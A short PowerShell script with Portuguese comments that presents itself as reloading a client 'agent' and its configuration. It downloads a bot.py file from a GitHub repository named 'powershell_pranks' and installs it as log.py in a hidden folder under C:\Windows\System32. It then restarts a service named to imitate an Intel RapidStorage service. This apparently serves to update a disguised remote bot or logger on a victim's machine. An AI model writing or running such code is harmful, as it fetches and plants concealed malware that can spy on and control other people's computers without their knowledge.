# Faz reload do agente e das configurações instaladas no cliente
$destino = 'C:\Windows\System32\ap32\log.py'
$destino2 = 'C:\Windows\System32\ap32\log2.py'


try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/bot.py?dl=1" -OutFile $destino2
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}

if (Test-Path $destino) {
    Remove-Item $destino -Force
}

Copy-Item -Path $destino2 -Destination $destino -Force

Remove-Item $destino2 -Force

Start-Sleep -Seconds 5

Restart-Service -Name "Intel(R) RapidStorage Find Service" -Force

Write-Host "Agente e configurações recarregadas com sucesso!"
